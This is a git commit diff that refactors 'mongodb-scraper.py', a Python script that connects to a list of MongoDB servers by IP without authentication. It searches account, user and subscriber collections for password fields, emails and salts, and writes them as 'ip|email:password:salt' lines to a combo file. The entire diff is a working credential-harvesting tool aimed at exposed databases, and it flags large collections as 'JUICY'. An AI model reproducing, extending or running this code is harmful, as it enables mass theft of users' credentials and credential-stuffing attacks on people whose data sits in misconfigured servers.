a43335bb8da54b24fe67b5bccd2075236bdbe46c
Davide Tampellini <tampe125@gmail.com>
2015-12-19 13:58:46 +0100

    Refactor to use a class instead of a function

--- mongodb-scraper.py
+++ mongodb-scraper.py
@@ -8,186 +8,198 @@ import io
 import os
 
 
-def scrape():
-    if not os.path.exists('data'):
-        os.makedirs('data')
+class MongodbScraper:
+    def __init__(self):
+        # Init class variables
+        self.ips = []
+        self.processed = []
+        self.table_names = ['account', 'user', 'subscriber']
+        self.column_names = ['pass', 'pwd']
+        self.email_regex = re.compile(r'[a-z0-9\-\._]+@[a-z0-9\-\.]+\.[a-z]{2,4}')
 
-    mongo_logger = logging.getLogger('mongodb-scraper')
-    logging.basicConfig(level=logging.DEBUG,
-                        format='%(asctime)s|%(levelname)-8s| %(message)s',
-                        datefmt='%Y-%m-%d %H:%M:%S',
-                        filename='mongodb-scraper.log')
+        # Init the logger
+        self.logger = logging.getLogger('mongodb-scraper')
+        logging.basicConfig(level=logging.DEBUG,
+                            format='%(asctime)s|%(levelname)-8s| %(message)s',
+                            datefmt='%Y-%m-%d %H:%M:%S',
+                            filename='mongodb-scraper.log')
 
-    console = logging.StreamHandler()
-    console.setLevel(logging.INFO)
+        console = logging.StreamHandler()
+        console.setLevel(logging.INFO)
 
-    formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)s")
-    console.setFormatter(formatter)
-    mongo_logger.addHandler(console)
+        formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)s")
+        console.setFormatter(formatter)
+        self.logger.addHandler(console)
 
-    mongo_logger.info("Opening data")
+        # Check that the data dir exists
+        if not os.path.exists('data'):
+            os.makedirs('data')
 
-    email_regex = re.compile(r'[a-z0-9\-\._]+@[a-z0-9\-\.]+\.[a-z]{2,4}')
+        # Load previous data
+        self._load_data()
 
-    try:
-        with open('data.json', 'r') as data_json:
-            ips = json.load(data_json)
-    except (IOError, ValueError):
-        print "Please provide a valid JSON encoded file in data.json"
-        return
-
-    mongo_logger.info("Found " + str(len(ips)) + " IPs to connect")
-
-    try:
-        with open('processed.json', 'r') as processed_json:
-            processed = json.load(processed_json)
-    except (IOError, ValueError):
-        # Meh, I'll live with that...
-        processed = []
-
-    if processed:
-        mongo_logger.info("Found " + str(len(processed)) + " already processed IP")
-
-    table_names = ['account', 'user', 'subscriber']
-    column_names = ['pass', 'pwd']
-
-    for ip in ips:
-        # Do I have already processed this IP?
-        if ip in processed:
-            continue
-
-        mongo_logger.info("Connecting to " + ip)
+    def _load_data(self):
+        self.logger.info("Opening data")
 
         try:
-            client = MongoClient(ip, connectTimeoutMS=5000)
-            dbs = client.database_names()
-        except (KeyboardInterrupt, SystemExit):
-            return
-        except:
-            mongo_logger.warning("An error occurred while connecting to " + ip + ". Skipping")
-            # Don't cry if we can't connect to the server
-            processed.append(ip)
-            continue
+            with open('data.json', 'r') as data_json:
+                self.ips = json.load(data_json)
+        except (IOError, ValueError):
+            raise RuntimeError("Please provide a valid JSON encoded file in data.json")
 
-        mongo_logger.debug("Database found: " + ', '.join(dbs))
+        self.logger.info("Found " + str(len(self.ips)) + " IPs to connect")
 
-        for db in dbs:
-            # Skip local system databases
-            if db in ['admin', 'local']:
+        try:
+            with open('processed.json', 'r') as processed_json:
+                self.processed = json.load(processed_json)
+        except (IOError, ValueError):
+            # Meh, I'll live with that...
+            pass
+
+        if self.processed:
+            self.logger.info("Found " + str(len(self.processed)) + " already processed IP")
+
+    def scrape(self):
+        for ip in self.ips:
+            # Do I have already processed this IP?
+            if ip in self.processed:
                 continue
 
-            o_db = client[db]
+            self.logger.info("Connecting to " + ip)
 
             try:
-                collections = o_db.collection_names()
+                client = MongoClient(ip, connectTimeoutMS=5000)
+                dbs = client.database_names()
             except (KeyboardInterrupt, SystemExit):
                 return
-            except Exception:
-                # Don't cry if something bad happens
-                mongo_logger.warning("\tAn error occurred while fetching collections from " + ip + ". Skipping.")
-                break
+            except:
+                self.logger.warning("An error occurred while connecting to " + ip + ". Skipping")
+                # Don't cry if we can't connect to the server
+                self.processed.append(ip)
+                continue
 
-            for collection in collections:
-                mongo_logger.debug("\t\tAnalyzing collection: " + collection)
-                # Is this a collection I'm interested into?
-                if not any(table in collection for table in table_names):
+            self.logger.debug("Database found: " + ', '.join(dbs))
+
+            for db in dbs:
+                # Skip local system databases
+                if db in ['admin', 'local']:
                     continue
 
-                o_coll = o_db[collection]
+                o_db = client[db]
 
                 try:
-                    row = o_coll.find_one()
-                except:
-                    # Sometimes the collection is broken, let's skip it
-                    continue
+                    collections = o_db.collection_names()
+                except (KeyboardInterrupt, SystemExit):
+                    return
+                except Exception:
+                    # Don't cry if something bad happens
+                    self.logger.warning("\tAn error occurred while fetching collections from " + ip + ". Skipping.")
+                    break
 
-                interesting = False
+                for collection in collections:
+                    self.logger.debug("\t\tAnalyzing collection: " + collection)
+                    # Is this a collection I'm interested into?
+                    if not any(table in collection for table in self.table_names):
+                        continue
 
-                # If the collection is empty I get a null row
-                if row:
+                    o_coll = o_db[collection]
+
+                    try:
+                        row = o_coll.find_one()
+                    except:
+                        # Sometimes the collection is broken, let's skip it
+                        continue
+
+                    interesting = False
+
+                    # If the collection is empty I get a null row
+                    if row:
+                        for key, value in row.iteritems():
+                            # Is that a column we're interested into?
+                            if any(column in key for column in self.column_names):
+                                # Only consider plain strings, nothing fancy
+                                if isinstance(value, basestring):
+                                    interesting = True
+                                    break
+
+                    # This collection has no interesting data? Let's skip it
+                    if not interesting:
+                        continue
+
+                    self.logger.info("Table with interesting data found")
+
+                    # Ok there is interesting data inside it. Let's find if there is an email address, too
+                    # I'll just check the first record and hope there is something similar to an email address.
+                    email_field = ''
+
                     for key, value in row.iteritems():
-                        # Is that a column we're interested into?
-                        if any(column in key for column in column_names):
-                            # Only consider plain strings, nothing fancy
-                            if isinstance(value, basestring):
-                                interesting = True
+                        # If we find anything that resemble an email address, let's store it
+                        if isinstance(value, basestring):
+                            if re.match(self.email_regex, value.encode('utf-8')):
+                                email_field = key
                                 break
 
-                # This collection has no interesting data? Let's skip it
-                if not interesting:
-                    continue
+                    rows = o_coll.find()
+                    total = rows.count()
 
-                mongo_logger.info("Table with interesting data found")
+                    if total > 750:
+                        self.logger.info("***FOUND COLLECTION WITH  " + str(total) + "  RECORDS. JUICY!!")
 
-                # Ok there is interesting data inside it. Let's find if there is an email address, too
-                # I'll just check the first record and hope there is something similar to an email address.
-                email_field = ''
+                    lines = []
 
-                for key, value in row.iteritems():
-                    # If we find anything that resemble an email address, let's store it
-                    if isinstance(value, basestring):
-                        if re.match(email_regex, value.encode('utf-8')):
-                            email_field = key
-                            break
-
-                rows = o_coll.find()
-                total = rows.count()
-
-                if total > 750:
-                    mongo_logger.info("***FOUND COLLECTION WITH  " + str(total) + "  RECORDS. JUICY!!")
-
-                lines = []
-
-                for row in rows:
-                    try:
-                        email = row[email_field]
-                        if not email:
-                            email = ''
-                    except:
-                        email = ''
-
-                    for key, value in row.iteritems():
+                    for row in rows:
                         try:
-                            # Is that a column we're interested into?
-                            if any(column in key for column in column_names):
-                                # Skip empty values
-                                if not value:
-                                    continue
+                            email = row[email_field]
+                            if not email:
+                                email = ''
+                        except:
+                            email = ''
 
-                                # Skip fields that are not strings (ie reset_pass_date => datetime object)
-                                if not isinstance(value, basestring):
-                                    continue
+                        for key, value in row.iteritems():
+                            try:
+                                # Is that a column we're interested into?
+                                if any(column in key for column in self.column_names):
+                                    # Skip empty values
+                                    if not value:
+                                        continue
 
-                                # Try to fetch the salt, if any
-                                try:
-                                    salt = row['salt'].encode('utf-8')
-                                    if not salt:
+                                    # Skip fields that are not strings (ie reset_pass_date => datetime object)
+                                    if not isinstance(value, basestring):
+                                        continue
+
+                                    # Try to fetch the salt, if any
+                                    try:
+                                        salt = row['salt'].encode('utf-8')
+                                        if not salt:
+                                            salt = ''
+                                    except:
                                         salt = ''
-                                except:
-                                    salt = ''
 
-                                value = value.encode('utf-8') + ':' + salt
+                                    value = value.encode('utf-8') + ':' + salt
 
-                                lines.append(unicode(ip.encode('utf-8') + '|' + email + ':' + value + '\n'))
-                        except UnicodeDecodeError:
-                            # You know what? I'm done dealing with all those crazy encodings
-                            mongo_logger.warn("An error occurred while encoding the string. Skipping")
-                            continue
+                                    lines.append(unicode(ip.encode('utf-8') + '|' + email + ':' + value + '\n'))
+                            except UnicodeDecodeError:
+                                # You know what? I'm done dealing with all those crazy encodings
+                                self.logger.warn("An error occurred while encoding the string. Skipping")
+                                continue
 
-                    # If I get a very long list, let's write it in batches
-                    if len(lines) >= 1000:
-                        mongo_logger.info("\t\tFetched more than 1000 records, dumping them to file")
-                        with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
-                            fp_pass.writelines(lines)
-                            lines = []
+                        # If I get a very long list, let's write it in batches
+                        if len(lines) >= 1000:
+                            self.logger.info("\t\tFetched more than 1000 records, dumping them to file")
+                            with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
+                                fp_pass.writelines(lines)
+                                lines = []
 
-                with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
-                    fp_pass.writelines(lines)
+                    with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
+                        fp_pass.writelines(lines)
 
-        client.close()
-        processed.append(ip)
-        with open('processed.json', 'w') as processed_json:
-            json.dump(processed, processed_json)
+            client.close()
+            self.processed.append(ip)
+            with open('processed.json', 'w') as processed_json:
+                json.dump(self.processed, processed_json)
+
 
 if __name__ == '__main__':
-    scrape()
+    scraper = MongodbScraper()
+    scraper.scrape()
+
